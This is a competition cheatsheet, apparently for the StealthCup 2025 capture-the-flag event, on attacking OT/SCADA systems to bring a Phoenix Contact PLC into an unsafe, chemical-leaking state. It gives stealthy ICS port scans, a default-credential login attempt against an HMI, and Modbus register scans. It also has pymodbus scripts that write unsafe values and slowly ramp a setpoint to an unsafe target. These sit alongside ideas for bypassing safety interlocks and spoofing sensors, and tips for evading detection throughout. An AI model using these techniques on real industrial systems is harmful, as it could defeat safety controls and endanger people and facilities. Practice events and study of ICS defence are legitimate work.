# StealthCup 2025: OT/SCADA Attack Cheatsheet

This cheatsheet covers techniques for interacting with the Operational Technology (OT) environment in StealthCup, focusing on achieving the **OT Cup objective** (leak chemicals by bringing the PLC into an unsafe state, setting the PORV flag) while minimizing alerts.

**Target**: Phoenix Contact PLC and associated SCADA/HMI systems.

## 1. OT Reconnaissance (Stealthy)

Before attempting to manipulate the PLC, gather information about the OT environment.

- **Passive Network Analysis**: Capture and analyze OT network traffic.
  - **Tools**: `tcpdump`, `wireshark`, `zeek`
  - **Example (`tcpdump` - Capture Industrial Protocol Traffic)**:
    ```bash
    # Capture Modbus TCP traffic (port 502)
    sudo tcpdump -i eth0 -n port 502 -w modbus_capture.pcap
    # Capture EtherNet/IP traffic (port 44818)
    sudo tcpdump -i eth0 -n port 44818 -w ethernet_ip_capture.pcap
    ```
  - **Evasion Tip**: Passive monitoring doesn't generate traffic. Analyze captured PCAPs offline to identify control systems, protocols, and communication patterns.

- **Port Scanning (Targeted)**: Scan for common industrial protocol ports.
  - **Tools**: `nmap` with specific industrial protocol ports
  - **Example (`nmap` - Industrial Protocol Scan)**:
    ```bash
    # Scan for common ICS/SCADA ports with extreme caution
    nmap -sS -Pn -n --max-retries 1 --scan-delay 5s -p 102,502,20000,44818,47808,1911,9600,1962,20547 <target_IP>
    ```
  - **Evasion Tip**: Use extremely slow scanning (`--scan-delay`). Consider scanning one port at a time. Avoid version detection initially.

- **Service Identification**: Identify SCADA/HMI components and historian databases.
  - **Tools**: Manual web browsing, banner grabbing
  - **Example (HTTP Banner Grab)**:
    ```bash
    curl -s -I http://<target_IP>:<port>
    ```
  - **Evasion Tip**: Use standard HTTP clients that mimic browser behavior. Avoid aggressive crawling or fuzzing.

## 2. Understanding Industrial Protocols

Phoenix Contact PLCs typically support several industrial protocols. Understanding these is crucial.

- **Modbus TCP (Port 502)**: Simple master-slave protocol with function codes and register addresses.
  - **Tools**: `modbus-cli`, `pymodbus`, `modbus-scanner.py`
  - **Example (Read Coils with `pymodbus`)**:
    ```python
    from pymodbus.client.sync import ModbusTcpClient
    client = ModbusTcpClient('<plc_ip>', port=502)
    result = client.read_coils(0, 10)  # Read 10 coils starting at address 0
    print(result.bits)
    client.close()
    ```
  - **Evasion Tip**: Use legitimate function codes (1, 2, 3, 4 for reading). Avoid writing initially. Mimic normal polling patterns.

- **EtherNet/IP (Port 44818)**: Common in industrial automation, used by many PLCs.
  - **Tools**: `cpppo`, `pycomm3`
  - **Example (Read Tags with `pycomm3`)**:
    ```python
    from pycomm3 import LogixDriver
    with LogixDriver('<plc_ip>') as plc:
        print(plc.get_tag_list())  # List available tags
        result = plc.read('SomeTag')  # Read a specific tag
        print(result)
    ```
  - **Evasion Tip**: Use standard CIP services. Avoid excessive tag discovery or browsing.

- **Profinet (Typically UDP 34964, 49152)**: Used by Siemens and some Phoenix Contact devices.
  - **Tools**: `profinet-tools`, Wireshark with PROFINET dissector
  - **Evasion Tip**: Extremely sensitive to non-standard interactions. Primarily use for passive analysis.

## 3. Accessing the SCADA/HMI

The competition mentions an "open source SCADA/HMI solution" - likely something like ScadaBR, OpenSCADA, or RapidSCADA.

- **Web Interface Reconnaissance**: Most modern HMI systems have web interfaces.
  - **Tools**: Standard browsers, `curl`, `wget`
  - **Example (Check for Default Credentials)**:
    ```bash
    # Try common default credentials
    curl -s -d "username=admin&password=admin" http://<hmi_ip>:<port>/login
    ```
  - **Evasion Tip**: Use standard HTTP methods. Avoid brute forcing. Look for default credentials in documentation.

- **Database Access**: Historian databases often contain valuable information.
  - **Tools**: Standard database clients (`mysql`, `psql`, etc.)
  - **Example (MySQL Connection)**:
    ```bash
    mysql -h <historian_ip> -u <username> -p<password> -e "SHOW DATABASES;"
    ```
  - **Evasion Tip**: Use legitimate database clients with proper authentication. Avoid excessive queries.

## 4. PLC Analysis and Manipulation

The ultimate goal is to trigger the PORV flag on the Phoenix Contact PLC.

- **PLC Program Analysis**: Understand the PLC logic before attempting manipulation.
  - **Tools**: Protocol-specific tools, Wireshark
  - **Evasion Tip**: Focus on understanding normal operations first. Look for safety-related variables and conditions.

- **Identifying Critical Variables**: Find variables related to the PORV flag and safety systems.
  - **Tools**: Protocol-specific read commands
  - **Example (Modbus Register Scan)**:
    ```python
    # Scan for interesting registers (simplified example)
    from pymodbus.client.sync import ModbusTcpClient
    client = ModbusTcpClient('<plc_ip>')
    for address in range(0, 1000, 10):  # Read in batches to reduce traffic
        result = client.read_holding_registers(address, 10)
        if not result.isError():
            print(f"Address {address}: {result.registers}")
    client.close()
    ```
  - **Evasion Tip**: Read operations are generally less monitored than write operations. Scan slowly and methodically.

- **Manipulating PLC State**: Once critical variables are identified, manipulate them to trigger the PORV flag.
  - **Tools**: Protocol-specific write commands
  - **Example (Modbus Write Single Register)**:
    ```python
    from pymodbus.client.sync import ModbusTcpClient
    client = ModbusTcpClient('<plc_ip>')
    # Write to a specific register to change a setpoint or state
    client.write_register(address=<critical_register>, value=<unsafe_value>)
    client.close()
    ```
  - **Evasion Tip**: Make minimal, targeted changes. Consider timing your changes during normal operational changes to blend in. Avoid making multiple changes in rapid succession.

- **Exploiting PLC Vulnerabilities**: Phoenix Contact PLCs may have specific vulnerabilities.
  - **Tools**: Research-based, protocol-specific
  - **Evasion Tip**: Targeted exploitation is generally less noisy than scanning or brute forcing.

## 5. Triggering the PORV Flag

The PORV (Pressure-Operated Relief Valve) flag likely indicates an overpressure condition that would cause a safety valve to open, resulting in a chemical leak.

- **Understanding Safety Systems**: Safety systems typically have multiple layers of protection.
  - **Evasion Tip**: Understand normal operating parameters before attempting manipulation.

- **Potential Approaches**:
  1. **Setpoint Manipulation**: Change pressure/temperature setpoints to unsafe values.
  2. **Safety Interlock Bypass**: Disable or bypass safety interlocks if possible.
  3. **Sensor Value Spoofing**: Make the system believe conditions are normal while pushing physical parameters to unsafe levels.
  4. **Control Loop Interference**: Disrupt PID control loops that maintain safe operation.

- **Example (Modbus Setpoint Manipulation)**:
  ```python
  from pymodbus.client.sync import ModbusTcpClient
  import time
  
  client = ModbusTcpClient('<plc_ip>')
  
  # Read current setpoint
  current_setpoint = client.read_holding_registers(address=<setpoint_register>, count=1)
  print(f"Current setpoint: {current_setpoint.registers[0]}")
  
  # Gradually increase setpoint to avoid sudden changes that might trigger alerts
  target_setpoint = <unsafe_value>
  current_value = current_setpoint.registers[0]
  
  while current_value < target_setpoint:
      current_value += 5  # Small increment
      client.write_register(address=<setpoint_register>, value=current_value)
      print(f"Setpoint changed to: {current_value}")
      time.sleep(30)  # Wait between changes to avoid rapid changes
  
  client.close()
  ```

- **Evasion Tip**: Make changes that could appear to be operator error or normal process fluctuations. Gradual changes are less likely to trigger alerts than sudden ones.

## General Evasion Tips for OT Attacks

- **Timing**: Perform actions during normal business hours when legitimate changes might occur.
- **Incremental Changes**: Make small, gradual changes rather than dramatic ones.
- **Legitimate Protocols**: Use standard industrial protocols and legitimate function codes/services.
- **Minimal Interaction**: Minimize the number of commands sent to the PLC.
- **Understand Normal Operation**: Learn what normal operation looks like before attempting changes.
- **Avoid Scanning**: Targeted interaction is better than broad scanning or enumeration.

Always consult the [Alert Evasion Cheatsheet](Alert-Evasion-Cheatsheet.md) and [Scoring System Cheatsheet](Scoring-System-Cheatsheet.md) before performing actions.
